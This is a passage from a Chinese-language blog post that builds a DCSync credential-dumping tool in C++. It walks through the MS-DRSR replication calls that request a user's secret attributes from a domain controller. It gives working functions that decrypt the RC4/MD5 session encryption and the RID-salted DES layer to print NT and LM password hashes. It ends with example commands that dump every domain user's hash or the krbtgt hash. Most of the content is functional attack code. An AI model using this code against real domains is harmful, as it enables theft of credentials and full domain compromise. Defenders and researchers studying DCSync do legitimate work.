						drsStatus = nameCrackReply.V1.pResult->rItems[0].status;
						if (status = (drsStatus == 0))
						{
							RtlInitUnicodeString(&UnicodeGuid, nameCrackReply.V1.pResult->rItems[0].pName);
							RtlGUIDFromString(&UnicodeGuid, pUserGuid);
						}
						else
							wprintf(L"[-] IDL_DRSCrackNames Error: 0x%08x (%u).\n", drsStatus, drsStatus);
					}
					else
						wprintf(L"[-] IDL_DRSCrackNames Error: No Item!\n");
				}
				else
					wprintf(L"[-] IDL_DRSCrackNames Error: Bad Version (%u).\n", dwOutVersion);
			}
			else
				wprintf(L"[-] IDL_DRSCrackNames Error: 0x%08x (%u).\n", drsStatus, drsStatus);
		}
		RpcExcept(EXCEPTION_EXECUTE_HANDLER);
		{
			wprintf(L"[-] Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
		}
		RpcEndExcept
		{
			return status;
		}
	}
	return status;
}
```

其中 nameCrackReq 是一个包含了客户端请求消息的 DRS_MSG_CRACKREQ 结构体，这里使用的是 DRS_MSG_CRACKREQ_V1 版本，该结构声明如下。

```c++
typedef struct {
   ULONG CodePage;
   ULONG LocaleId;
   DWORD dwFlags;
   DWORD formatOffered;
   DWORD formatDesired;
   [range(1,10000)] DWORD cNames;
   [string, size_is(cNames)] WCHAR** rpNames;
 } DRS_MSG_CRACKREQ_V1;
```

DRS_MSG_CRACKREQ_V1 结构中的 rpNames 属性用于设置需要查找的对象名称，该名称的格式由 formatOffered 属性指定，支持但不限于以下几种格式。

|            格式            |                             说明                             |
| :------------------------: | :----------------------------------------------------------: |
|     DS_FQDN_1779_NAME      | 完全限定的可分辨名称（例如，CN=NameOfPerson，OU=Users，DC=Example，DC=Fabrikam，DC=Com）。 |
|    DS_NT4_ACCOUNT_NAME     | Windows 帐户名称（例如 域名\用户名）。仅域的情况下包括尾随反斜杠（\）。 |
|      DS_DISPLAY_NAME       |                     用户友好的显示名称。                     |
|     DS_UNIQUE_ID_NAME      | objectGUID 加大括号的字符串表示形式（例如，{4fa050f0-f561-11cf-bdd9-00aa003a77b6}）。 |
|     DS_CANONICAL_NAME      | 完整的规范名称（例如，example.microsoft.com/software/someone）。仅限域的情况下包括尾随正斜杠（/） 。 |
|   DS_USER_PRINCIPAL_NAME   |    用户主体名称（例如，someone@example.microsoft.com）。     |
|    DS_CANONICAL_NAME_EX    | 与 DS_CANONICAL_NAME 相同，只是最右边的正斜杠（/）被替换为换行符（\n）。 |
| DS_SERVICE_PRINCIPAL_NAME  | 通用服务主体名称 (例如 www/www.microsoft.com@microsoft.com) 。 |
| DS_SID_OR_SID_HISTORY_NAME | 对象的安全标识符（SID），这可以是对象当前的 SID 或 SID History。此值对 formatDesired 参数无效。 |

formatDesired 属性用于设置返回的名称格式，在这里将其设为 DS_UNIQUE_ID_NAME，表示最终将返回 GUID 格式的对象名称。

### 发起域控同步请求

至此，通过调用 Get_IDL_DRSDomainControllerInfo 和 Get_IDL_DRSCrackNames 成功获取了域控制器和目标对象的 GUID。接下来会调用 IDL_DRSGetNCChanges 函数香指定 GUID 的域控发起同步请求，并获取给定 GUID 的目录对象的副本更新。

在调用 IDL_DRSGetNCChanges 之前，由 getChgReq 构造客户端请求消息，这是一个 DRS_MSG_GETCHGREQ 结构体，这里使用的是 DRS_MSG_GETCHGREQ_V8 版本，该结构声明如下。

```c++
 typedef struct {
   UUID uuidDsaObjDest;
   UUID uuidInvocIdSrc;
   [ref] DSNAME* pNC;
   USN_VECTOR usnvecFrom;
   [unique] UPTODATE_VECTOR_V1_EXT* pUpToDateVecDest;
   ULONG ulFlags;
   ULONG cMaxObjects;
   ULONG cMaxBytes;
   ULONG ulExtendedOp;
   ULARGE_INTEGER liFsmoInfo;
   [unique] PARTIAL_ATTR_VECTOR_V1_EXT* pPartialAttrSet;
   [unique] PARTIAL_ATTR_VECTOR_V1_EXT* pPartialAttrSetEx;
   SCHEMA_PREFIX_TABLE PrefixTableDest;
 } DRS_MSG_GETCHGREQ_V8;
```

uuidDsaObjDest 和 uuidInvocIdSrc 分别表示客户端 DC 和服务端 DC 的 GUID，这两个值可以同时设为前面获取的域控制器的 GUID。

pNC 表示要复制的副本的 NC 根或扩展操作的 FSMO 角色对象，是一个指向 DSNAME 结构的指针，支持通过 GUID、SID 或 distinguishedName 来标识一个活动目录对象，这里将其设为要转储凭据的用户的 GUID。

ulFlags 用于设置客户端请求消息的一组选项，这里为其设置了以下五个选项。

|      位标志       |                            说明                            |
| :---------------: | :--------------------------------------------------------: |
|   DRS_INIT_SYNC   |                      启动时执行复制。                      |
|   DRS_WRIT_REP    |      复制可写副本，而不是只读部分副本或只读完整副本。      |
| DRS_NEVER_SYNCED  |               没有从该源服务器成功完成复制。               |
| DRS_FULL_SYNC_NOW | 获取复制周期中的所有更新，即使是那些通常会被过滤掉的更新。 |
|  DRS_SYNC_URGENT  |        立即执行请求的复制，不要等待任何超时或延迟。        |

cMaxObjects 和 cMaxBytes 分别表示要包含在回复中的对象数量和字节数的的近似上限。

pPartialAttrSet 是一组一个或多个属性 ，其值将被复制到客户端的部分副本，如果客户端有完整副本，则为空。这是一个指向 PARTIAL_ATTR_VECTOR_V1_EXT 结构的指针，其声明如下。

```c++
 typedef struct {
   DWORD dwVersion;
   DWORD dwReserved1;
   [range(1,1048576)] DWORD cAttrs;
   [size_is(cAttrs)] ATTRTYP rgPartialAttr[];
 } PARTIAL_ATTR_VECTOR_V1_EXT;
```

要复制的属性全部包含在 ATTRTYP 结构的 rgPartialAttr 集合里。可以将 ATTRTYP 理解为 OID 数据格式的压缩表示，其与 OID 可以相互映射和转换。

PrefixTableDest 是用于将 pPartialAttrSet 中的 ATTRTYP 值转换为 OID 的前缀表，这是一个 SCHEMA_PREFIX_TABLE 结构体，其声明如下。

```c++
 typedef struct {
   [range(0,1048576)] DWORD PrefixCount;
   [size_is(PrefixCount)] PrefixTableEntry* pPrefixEntry;
 } SCHEMA_PREFIX_TABLE;
```

pPrefixEntry 表示 PrefixCount 个项数的数组，包含了一系列在 ATTRTYP 值 OID 值之间映射转换的前缀表项。所有的表项均为 PrefixTableEntry 结构，其声明如下，其中的 ndx 是分配给该前缀表项的索引，prefix 是 OID 或 OID 的前缀。

```c++
 typedef struct {
   unsigned long ndx;
   OID_t prefix;
 } PrefixTableEntry;
```

在构造 getChgReq 时，会调用自定义函数 MakeAttid 分别设置 &getChgReq.V8.PrefixTableDest 和 &getChgReq.V8.pPartialAttrSet->rgPartialAttr，该函数定义如下。

```c++
BOOL MakeAttid(SCHEMA_PREFIX_TABLE* pPrefixTable, LPCSTR szOid, ATTRTYP* pAttr, BOOL toAdd)
{
	BOOL status = FALSE;
	DWORD lastValue, ndx;
	PSTR lastValueString;
	OssEncodedOID oidPrefix;

	if (lastValueString = strrchr(szOid, '.'))
	{
		lastValueString++;
		lastValue = strtoul(lastValueString, NULL, 0);
		*pAttr = (WORD)lastValue % 0x4000;
		if (*pAttr >= 0x4000)
			*pAttr += 0x8000;

		if (Asn1_DotVal2Eoid(szOid, &oidPrefix))
		{
			oidPrefix.length -= (lastValue < 0x80) ? 1 : 2;
			if (status = AddPrefixToTable(pPrefixTable, &oidPrefix, &ndx, toAdd))
				*pAttr |= ndx << 16;
			else wprintf(L"[-] AddPrefixToTable Failed.\n");
			Asn1_freeEnc(oidPrefix.value);
		}
	}
	return status;
}
```

MakeAttid 首先将传入的 szOid，也就是需要获取更新的对象属性的 OID ，使用 Asn1_DotVal2Eoid 函数进行 ASN.1 编码得到 oidPrefix。然后对 oidPrefix 和传入的 PrefixTableDest 调用 AddPrefixToTable 方法，该函数定义如下。

```c++
BOOL AddPrefixToTable(SCHEMA_PREFIX_TABLE* pPrefixTable, OssEncodedOID* pOidPrefix, DWORD* ndx, BOOL ifAdd)
{
	BOOL status = FALSE;
	DWORD i;
	PrefixTableEntry* entries;

	for (i = 0; i < pPrefixTable->PrefixCount; i++)
	{
		if (pPrefixTable->pPrefixEntry[i].prefix.length == pOidPrefix->length)
		{
			if (RtlEqualMemory(pPrefixTable->pPrefixEntry[i].prefix.elements, pOidPrefix->value, pOidPrefix->length))
			{
				status = TRUE;
				*ndx = pPrefixTable->pPrefixEntry[i].ndx;
				break;
			}
		}
	}

	if (!status && ifAdd)
	{
		*ndx = pPrefixTable->PrefixCount;
		if (entries = (PrefixTableEntry*)MIDL_user_allocate(sizeof(PrefixTableEntry) * ((*ndx) + 1)))
		{
			RtlCopyMemory(entries, pPrefixTable->pPrefixEntry, sizeof(PrefixTableEntry) * (*ndx));
			entries[*ndx].ndx = *ndx;
			entries[*ndx].prefix.length = pOidPrefix->length;
			if (entries[*ndx].prefix.elements = (PBYTE)MIDL_user_allocate(pOidPrefix->length))
			{
				RtlCopyMemory(entries[*ndx].prefix.elements, pOidPrefix->value, pOidPrefix->length);
				if (pPrefixTable->pPrefixEntry)
					MIDL_user_free(pPrefixTable->pPrefixEntry);
				pPrefixTable->pPrefixEntry = entries;
				pPrefixTable->PrefixCount++;
				status = TRUE;
			}
		}
	}
	return status;
}
```

此时 prefixTable->PrefixCount 为空，并且 toAdd 被设为了 True，因此主要完成以下操作：

1. 初始化 ndx 的值，作为 PrefixTableEntry 数组的索引，并在后续用于生成 ATTRTYP 值。
2. 创建一个数组 entries，并在数组中定义 PrefixTableEntry 结构的元素。
3. 为每个 PrefixTableEntry 元素设置 ndx 和 prefix 两个属性。
4. 使用 RtlCopyMemory 函数将 ASN.1 编码的 OID（oidPrefix）值赋值给 prefix 属性。
5. 将数组 entries 赋值给 `prefixTable->pPrefixEntry`，至此便设置了请求消息中的前缀表。

返回 MakeAttid 方法后，将取到的 ndx 值左移 16 位并或运算之后，得到 ATTRTYP 结构的 pAttr，并由 pAttr 组成请求消息中的 rgPartialAttr。

至此，请求消息的构造已经完成，IDL_DRSGetNCChanges 函数将被调用，请求消息被发送到域控制器。

### 处理域控响应消息

域控制器返回的响应消息将由 getChgReply 接收，这是一个 DRS_MSG_GETCHGREPLY 结构体，这里使用的是 DRS_MSG_GETCHGREPLY_V6 版本，其声明如下。

```c++
 typedef struct {
   UUID uuidDsaObjSrc;
   UUID uuidInvocIdSrc;
   [unique] DSNAME* pNC;
   USN_VECTOR usnvecFrom;
   USN_VECTOR usnvecTo;
   [unique] UPTODATE_VECTOR_V2_EXT* pUpToDateVecSrc;
   SCHEMA_PREFIX_TABLE PrefixTableSrc;
   ULONG ulExtendedRet;
   ULONG cNumObjects;
   ULONG cNumBytes;
   [unique] REPLENTINFLIST* pObjects;
   BOOL fMoreData;
   ULONG cNumNcSizeObjects;
   ULONG cNumNcSizeValues;
   [range(0,1048576)] DWORD cNumValues;
   [size_is(cNumValues)] REPLVALINF_V1* rgValues;
   DWORD dwDRSError;
 } DRS_MSG_GETCHGREPLY_V6;
```

其中 pObjects，这是一个 REPLENTINFLIST 结构的表链，包含了客户端应用于其 NC 副本的对象更新。cNumObjects 是 pObjects 链表中项目的计数。PrefixTableSrc 与请求消息中的 PrefixTableDest 类似，是用于在响应中将 ATTRTYP 值转换为 OID 值的前缀表。下面主要关注 pObjects，其结构的声明如下。

```c++
 typedef struct REPLENTINFLIST {
   struct REPLENTINFLIST* pNextEntInf;
   ENTINF Entinf;
   BOOL fIsNCPrefix;
   UUID* pParentGuid;
   PROPERTY_META_DATA_EXT_VECTOR* pMetaDataExt;
 } REPLENTINFLIST;
```

pNextEntInf 指向表链中的下一个 REPLENTINFLIST 结构，或者为空。Entinf 包含了对象标识及其更新的属性，其结构体为 ENTINF，声明如下。

```c++
 typedef struct {
   DSNAME* pName;
   unsigned long ulFlags;
   ATTRBLOCK AttrBlock;
 } ENTINF;
```

pName 为对象的标识。AttrBlock 包含了对象属性标识和值，其结构体为 ATTRBLOCK，声明如下。

```c++
 typedef struct {
   ATTRTYP attrTyp;
   ATTRVALBLOCK AttrVal;
 } ATTR;
```

attrTyp 为属性标识。AttrVal 为此属性的值序列，其结构体为 ATTRVALBLOCK，声明如下。

```c++
 typedef struct {
   [range(0,10485760)] ULONG valCount;
   [size_is(valCount)] ATTRVAL* pAVal;
 } ATTRVALBLOCK;
```

pAVal 是包含属性值的数组，其结构为 ATTRVAL，声明如下。而 valCount 是 pAVal 数组中的项数。

```c++
 typedef struct {
   [range(0,26214400)] ULONG valLen;
   [size_is(valLen)] UCHAR* pVal;
 } ATTRVAL;
```

pVal 数组中包含了属性的值，而 valLen 表示 pVal 的大小。

响应消息 getChgReply 中的 PrefixTableSrc 和 pObjects 会一并传入自定义函数 ProcessGetNCChangesReply 中进行消息处理，该函数定义如下。

```c++
BOOL ProcessGetNCChangesReply(SCHEMA_PREFIX_TABLE* pPrefixTable, REPLENTINFLIST* pObjects)
{
	BOOL status = FALSE;
	LPCSTR ENCRYPTED_OIDS[] = {
		szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
		szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
		szOID_ANSI_currentValue
	};

	ATTRTYP SecretAttributes[ARRAYSIZE(ENCRYPTED_OIDS)];
	REPLENTINFLIST* pReplentinflist, * pNextReplentinflist = pObjects;
	DWORD i, j, k;
	
	for (i = 0; i < ARRAYSIZE(SecretAttributes); i++)
	{
		if (MakeAttid(pPrefixTable, ENCRYPTED_OIDS[i], &SecretAttributes[i], FALSE))
			status = TRUE;
		else
			wprintf(L"[-] MakeAttid for %S Failed.\n", ENCRYPTED_OIDS[i]);
	}

	while (pReplentinflist = pNextReplentinflist)
	{
		pNextReplentinflist = pReplentinflist->pNextEntInf;
		if (pReplentinflist->Entinf.AttrBlock.pAttr)
		{
			for (i = 0; i < pReplentinflist->Entinf.AttrBlock.attrCount; i++)
			{
				for (j = 0; j < ARRAYSIZE(SecretAttributes); j++)
				{
					if (SecretAttributes[j] == pReplentinflist->Entinf.AttrBlock.pAttr[i].attrTyp
						&& pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal)
					{
						for (k = 0; k < pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; k++)
						{
							if (pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[k].pVal
								&& DecryptValuesIfNecessary(&pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[k], NULL))
								status = TRUE;
						}
						break;
					}
				}
			}
		}
	}
	return status;
}
```

该函数主要完成以下工作：

1. 创建一个包含敏感属性的数组 ENCRYPTED_OIDS，并该数组的大小从创建一个 ATTRTYP 结构的数组 SecretAttributes。
2. 对响应里的 PrefixTableSrc 和 ENCRYPTED_OIDS 调用 MakeAttid 方法，ENCRYPTED_OIDS 中字符串类型的 OID 值会被 ASN.1 编码（oidPrefix）。并且，由于传入的 PrefixTableSrc 里的 PrefixCount 不为空，并且 toAdd 被设为了 False，因此将在 AddPrefixToTable 方法中对 PrefixTableSrc 进行遍历，并使用 RtlEqualMemory 函数比较 pPrefixEntry 中的 OID 前缀与 oidPrefix 是否相同。
3. 如果相同，则获取 pPrefixEntry 中的 ndx 索引，由 MakeAttid 计算为 ATTRTYP 值后添加到了 SecretAttributes 数组中。
4. 接着对传入的 pObjects 的临时指针 pReplentinflist 进行遍历，并对 pReplentinflist 中每个在 SecretAttributes 范围内的属性值 pAVal 调用 DecryptValuesIfNecessary 函数进行解密。

### 解密机密属性值

根据微软官方文档的描述，目录对象的以下属性值为机密数据。而在 DCSync 攻击过程中，最关注的属性就是 dBCSPwd 和 unicodePwd，二者分别存储了用户的 LM Hash 和 NT Hash。

> 从 Windows Vista 和 Windows Server 2008 开始，默认情况下 Windows 只存储 NT Hash，LM Hash 将不再存在。

|         属性名          |                             说明                             |
| :---------------------: | :----------------------------------------------------------: |
|      currentValue       |                    LSA 机密的当前机密值。                    |
|       priorValue        |                     LSA 机密的上一个值。                     |
|         dBCSPwd         |             帐户的 LAN 管理器密码，即 LM Hash。              |
|      lmPwdHistory       |                    dBCSPwd 值的历史记录。                    |
|       unicodePwd        |          Windows NT 格式的用户的密码，即 NT Hash。           |
|      ntPwdHistory       |                  unicodePwd 值的历史记录。                   |
|   initialAuthIncoming   |    包含有关客户端对此服务器的初始传入身份验证请求的信息。    |
|   initialAuthOutgoing   | 包含有关此域的身份验证服务器发送到请求身份验证的客户端的初始传出身份验证的信息。 |
| supplementalCredentials |                 用于进行身份验证的存储凭据。                 |
|    trustAuthIncoming    |                 信任传入部分的身份验证信息。                 |
|    trustAuthOutgoing    |                 信任传出部分的身份验证信息。                 |

在复制此类属性时，会执行名为 EncryptValuesIfNecessary 的过程，使用 MD5 摘要、CRC32 校验和以及 RC4 流密码对这些属性值（ATTRVAL* pAVal）进行加密，如下图所示。

![image-20221206230515962](/assets/posts/2023-01-6-how-to-implement-a-dcsync-by-yourself/image-20221206230515962.png)

微软文档中通过伪代码详细记录了的加密过程，相关代码和具体过程如下所示。

```c++
 sessionKey: sequence of BYTE
 i: integer
 salt: sequence of BYTE
 md5Context: MD5_CTX
 crc: ULONG
 pPayload: ADDRESS OF ENCRYPTED_PAYLOAD
  
  
 if not IsSecretAttribute(attr.attrTyp) then
   /* No additional encryption necessary. */
   return 0
 endif
  
 if not DRS_EXT_STRONG_ENCRYPTION in ClientExtensions(hDrs).dwFlags then
   return SEC_E_ALGORITHM_MISMATCH
 endif
  
  
  
 /* Get session key associated with the RPC connection. */
 sessionKey := session key associated with security context of hDrs,
   as specified by [MS-RPCE] section 3.3.1.5.2, "Building and Using a
   Security Context", and [MS-KILE] section 3.1.1.2, "Cryptographic
   Material"
  
  
 /* Encrypt each value of this attribute. */
 for i := 0 to attr.AttrVal.valCount - 1
   salt := randomly generated 128-bit number
  
  
   /* Calculate checksum of the clear value. */
   crc := CRC32 [ISO/IEC 13239] of the attr.AttrVal.pAVal[i].valLen
       bytes starting at attr.AttrVal.pAVal[i].pVal
  
  
   /* Compute encryption key. */
   MD5Init(md5Context)
   MD5Update(md5context, sessionKey, sessionKey.length)
   MD5Update(md5context, salt, 16)
   MD5Final(md5Context)
  
  
   /* Construct payload, encrypting its contents with the exception of
    * the Salt field. */
   pPayload := New ENCRYPTED_PAYLOAD, sized to hold
       attr.AttrVal.pAVal[i].valLen bytes in the EncryptedData field
   pPayload^.Salt := salt
   pPayload^.Checksum := crc
   Copy attr.AttrVal.pAVal[i].valLen bytes from
       attr.AttrVal.pAVal[i].pVal to pPayload^.EncryptedData
   Encrypt attr.AttrVal.pAVal[i].valLen + 4 bytes starting at the
       address of pPayload^.Checksum using the RC4 stream cipher
       algorithm [RC4] with encryption key md5Context.digest
  
  
   /* Replace the clear value with the encrypted value. */
   attr.AttrVal.pAVal[i].pVal := pPayload
   attr.AttrVal.pAVal[i].valLen := attr.AttrVal.pAVal[i].valLen + 20
 endfor
  
 return 0
```

1. 判断该属性值是否是机密数据，以决定是否有加密的必要。
2. 从当前 RPC 连接中获取关联的会话密钥。
3. 计算当前属性明文值的 CRC32 校验和（crc）。
4. 随机生成一个长度为 16 字节的 Salt 盐值。
5. 通过 MD5 算法加密会话密钥（sessionKey），生成对属性值进行加密的密钥。
6. 创建一个 valLen 大小的 ENCRYPTED_PAYLOAD 结构（pPayload），该结构实质上是加密属性值的具体类型，其中包含前面创建的盐值（Salt，16 bytes）校验（Checksum，4 bytes）和以及要加密的数据（EncryptedData）。
7. 将响应里 ATTRVAL 结构中的属性值 pVal 复制到 EncryptedData 中。
8. 从 Checksum 的地址开始，使用 RC4 流密码算法和 sessionKey 生成的密钥加密 valLen + 4 个字节，也就是加密整个 Checksum + EncryptedData 的部分。
9. 用加密后的 ENCRYPTED_PAYLOAD 结构替换 pVal 值，并为 valLen 的值扩充 20 个字节。

而自定义函数 DecryptValuesIfNecessary 就是对整个加密过程的逆算，该函数定义如下。

```c++
BOOL DecryptValuesIfNecessary(ATTRVAL* pAVal, SecPkgContext_SessionKey* pSessionKey)
{
	BOOL status = FALSE;
	PSecPkgContext_SessionKey pKey = pSessionKey ? pSessionKey : &rpc_drsr_sKey;
	PENCRYPTED_PAYLOAD encrypted = (PENCRYPTED_PAYLOAD)pAVal->pVal;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER cryptoKey = { MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest }, cryptoData;
	DWORD realLen;
	PVOID toFree;

	if (pKey->SessionKey && pKey->SessionKeyLength)
	{
		if ((pAVal->valLen >= (ULONG)FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData)) && pAVal->pVal)
		{
			MD5Init(&md5ctx);
			MD5Update(&md5ctx, pKey->SessionKey, pKey->SessionKeyLength);
			MD5Update(&md5ctx, encrypted->Salt, sizeof(encrypted->Salt));
			MD5Final(&md5ctx);

			cryptoData.Length = pAVal->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, CheckSum);
			cryptoData.MaximumLength = pAVal->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, CheckSum);
			cryptoData.Buffer = (PBYTE)&encrypted->CheckSum;

			if (NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
			{
				realLen = pAVal->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData);
				toFree = pAVal->pVal;
				if (pAVal->pVal = (UCHAR*)MIDL_user_allocate(realLen))
				{
					RtlCopyMemory(pAVal->pVal, encrypted->EncryptedData, realLen);
					pAVal->valLen = realLen;
					status = TRUE;
					MIDL_user_free(toFree);
				}
			}
			else wprintf(L"[-] RtlEncryptDecryptRC4 Error.\n");
		}
		else wprintf(L"[-] Decrypt_pAVal Error: No Valid Data.\n");
	}
	else wprintf(L"[-] Decrypt_pAVal Error: No Session Key.\n");
	return status;
}
```

该函数主要完成以下工作：

1. 从当前 RPC 连接中获取关联的会话密钥（在创建 RPC 绑定时获取）。
2. 从 PENCRYPTED_PAYLOAD 结构的属性值 pVal 中获取 Salt 盐值。
3. 通过 MD5 算法加密会话密钥（SessionKey），创建对属性值进行解密的密钥。
4. 使用 RC4 流密码算法和 SessionKey 生成的密钥解密从 Checksum 地址开始的 valLen - 16 个字节，也就是解密整个 Checksum + EncryptedData 的部分。
5. 用解密后的 EncryptedData 部分替换 pVal 值，并为 valLen 的值缩减 20 个字节。

至此，成功为 IDL_DRSGetNCChanges 响应解密了响应消息中的机密属性值。

### 描述转储结果

完成解密后，将继续对响应中的 PrefixTableSrc 和 pObject 中的 AttrBlock 调用自定义函数 DescribeUser，用于返回转储结果。该函数定义如下。

```c++
void DescribeUser(SCHEMA_PREFIX_TABLE* pPrefixTable, ATTRBLOCK* pAttrBlock, LPCWSTR szSrcDomain)
{
    DWORD rid = 0;
    PVOID objectSid;
    PBYTE encodedUnicodePwd;
    DWORD encodedUnicodePwdSize;
    PVOID sAMAccountName;
    DWORD sAMAccountNameSize;
    PVOID dBCSPwd;
    DWORD dBCSPwdSize;

    if (GetAttrValue(pPrefixTable, pAttrBlock, szOID_ANSI_objectSid, &objectSid, NULL))
    {
        rid = *GetSidSubAuthority(objectSid, *GetSidSubAuthorityCount(objectSid) - 1);
        if (GetAttrValue(pPrefixTable, pAttrBlock, szOID_ANSI_unicodePwd, &encodedUnicodePwd, &encodedUnicodePwdSize))
        {
            // Print domain name.
            wprintf(L"%s\\", szSrcDomain ? szSrcDomain : L"");
            // Print sAMAccountName.
            if (GetAttrValue(pPrefixTable, pAttrBlock, szOID_ANSI_sAMAccountName, &sAMAccountName, &sAMAccountNameSize))
                wprintf(L"%.*s:", sAMAccountNameSize / sizeof(wchar_t), (PWSTR)sAMAccountName);
            // Print rid.
            printf("%d:", rid);
            // Decrypt and print LM Hash.
            if (GetAttrValue(pPrefixTable, pAttrBlock, szOID_ANSI_dBCSPwd, &dBCSPwd, &dBCSPwdSize))
            {
                DecryptPwd(dBCSPwd, dBCSPwdSize, rid, 0);
                wprintf(L":");
            }
            else
            {
                wprintf(L"aad3b435b51404eeaad3b435b51404ee");
                wprintf(L":");
            }
            // Decrypt and print NT Hash.
            DecryptPwd(encodedUnicodePwd, encodedUnicodePwdSize, rid, 0);
            wprintf(L"\n");
        }
    }
}
```

其中还涉及两个自定义函数 GetAttrValue 和 DecryptPwd。GetAttrValue 函数通过传入响应里的前缀表（PrefixTableSrc）、解密后的属性值（AttrBlock）和指定属性的 OID，通过 MakeAttid 和 AddPrefixToTable 的系列调用获取指定属性的值，其定义如下。

```c++
BOOL GetAttrValue(SCHEMA_PREFIX_TABLE* pPrefixTable, ATTRBLOCK* pAttrBlock, LPCSTR szOid, PVOID* pData, DWORD* pSize)
{
	BOOL status = FALSE;
	PVOID pValue = NULL;
	ATTRVALBLOCK* attrvalblock = NULL;
	ATTR* attribute;
	ATTRTYP attrtyp;

	if (MakeAttid(pPrefixTable, szOid, &attrtyp, FALSE))
	{
		for (DWORD i = 0; i < pAttrBlock->attrCount; i++)
		{
			attribute = &pAttrBlock->pAttr[i];
			if (attribute->attrTyp == attrtyp)
			{
				attrvalblock = &attribute->AttrVal;
				if (attrvalblock)
				{
					if (attrvalblock->valCount == 1)
					{
						pValue = attrvalblock->pAVal[0].pVal;
						if(pData)
							*pData = pValue;
						if (pSize)
							*pSize = attrvalblock->pAVal[0].valLen;
						status = TRUE;
					}
					break;
				}
			}
		}
	}
	return status;
}
```

DecryptPwd 函数是再次对包含用户凭据的属性进行解密。为了防止机密数据的脱机提取，在 Active Directory 数据库 NTDS.DIT 中，微软使用安全主体的 RID 值作为加密函数的盐，对机密属性中的哈希值进行了部分加密。因此需要调用 DecryptPwd 函数对加密的用户凭据进行解密，该函数定义如下。

```c++
void DecryptPwd(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, DWORD wpFlags)
{
	BYTE decodedData[LM_NTLM_HASH_LENGTH];
	PCWCHAR WPRINTF_TYPES[] =
	{
		L"%02x",		// WPRINTF_HEX_SHORT
		L"%02x ",		// WPRINTF_HEX_SPACE
		L"0x%02x, ",	// WPRINTF_HEX_C
		L"\\x%02x",		// WPRINTF_HEX_PYTHON
	};

	if (NT_SUCCESS(RtlDecryptDES2blocks1DWORD(encodedData, &rid, decodedData)))
	{
		DWORD sep = wpFlags >> 16;
		PCWCHAR pType = WPRINTF_TYPES[wpFlags & 0x0000000f];
		for (DWORD i = 0; i < LM_NTLM_HASH_LENGTH; i++)
		{
			wprintf(pType, ((LPCBYTE)decodedData)[i]);
		}
	}
	else wprintf(L"[-] RtlDecryptDES2blocks1DWORD Error.");
}
```

解密后将成功输出用户密码的哈希值。至此，整个 DCSync 攻击过程完成。

# 运行效果演示

执行以下命令，转储域内所有用户的哈希凭据，如下图所示。

```powershell
SharpDCSync.exe -d pentest.com -u Administrator -p Admin@123
```

![image-20221207011242152](/assets/posts/2023-01-6-how-to-implement-a-dcsync-by-yourself/image-20221207011242152.png)

执行以下命令，转储域内指定用户的哈希凭据，如下图所示。

```powershell
SharpDCSync.exe -d pentest.com -u Administrator -p Admin@123 -t krbtgt
```

![image-20221207011339409](/assets/posts/2023-01-6-how-to-implement-a-dcsync-by-yourself/image-20221207011339409.png)
